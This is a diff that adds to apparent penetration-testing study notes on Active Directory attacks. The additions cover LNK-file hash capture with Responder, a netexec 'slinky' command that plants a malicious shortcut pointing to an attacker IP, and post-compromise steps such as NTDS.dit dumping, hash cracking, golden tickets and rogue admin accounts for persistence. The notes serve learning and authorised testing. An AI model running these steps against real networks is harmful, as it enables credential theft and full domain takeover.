@@ -244,10 +244,60 @@ LNK file attacks involve the malicious use of Windows shortcut files to execute 
 say for example we have access to a file share. we can dump a malicious file into it. 
 
    <img width="640" height="145" alt="image" src="https://github.com/user-attachments/assets/9fa40aa7-7edd-41ad-a8f2-7372db5a9767" />
-if the file created gets dumped into the file share and a user visits, we can capture the user hash
+if the file created gets dumped into the file share and a user visits, we can capture the user hash with responder.
+
+   <img width="814" height="618" alt="image" src="https://github.com/user-attachments/assets/d6992011-ce96-449f-8b0d-24584153d2f4" />
+
+   <img width="972" height="202" alt="image" src="https://github.com/user-attachments/assets/276281f8-3a6a-495a-acb7-2e83c748e3ad" />
+
+you can also automate the process of creating the malicious lnk file and dumping it into the file share using the command: netexec smb <ip_address_of_domain> -d domain.local -u user -p Password -M slinky -o NAME=test SERVER=<attacker_Ip address>
+
+e. GPP attacks AKA  cPassword attacks (explain that it mean)
+
+Post Compromise attack strategy
+ we have an account, now what?
+ * search the quick wins
+   Kerberoasting
+   secretdump
+   pass the hash/pass the password
+* No quick wins Dig deep!
+     Enumerate( Bloodhound,)
+     where does your account have access
+     check for old vulnerabilities
+* Think outside the box
+
+We hvae compromised the Domain controller, now what is next??
+WE OWN THE DOMAIN
+NOW WHAT?
+Preide as much value to the client as possible
+Put your blinders on and do it again
+Dump the NTDS.dit and crack passwords
+• Enumerate shares for sensitive information
+Persistence can be important
+• What happens if our DA access is lost?
+• Creating a DA account can be useful
+(DO NOT FORGET TO DELETE IT)
+• Creating a Golden Ticket can be useful, too.
+Do a little dance, probably
+
+a. Dumping the NTDS.dit
+it is a database used to store Active directory data. This data includes: user info, group information, security descriptors, password hashes
+
+
+   <img width="773" height="284" alt="image" src="https://github.com/user-attachments/assets/e9f9027c-f59f-4437-b95d-a908aa20c7a1" />
+
+We can crack the hash using Hashcat
+
+b. Golden ticket attacks
+what is it?  when we compromise the krbrgt account, we own the domain
+we can request access to any resource or system on the domain. with the golden ticket, we have complete access to every machine.
+
 
 
    
+   
+   
+
 
 
 
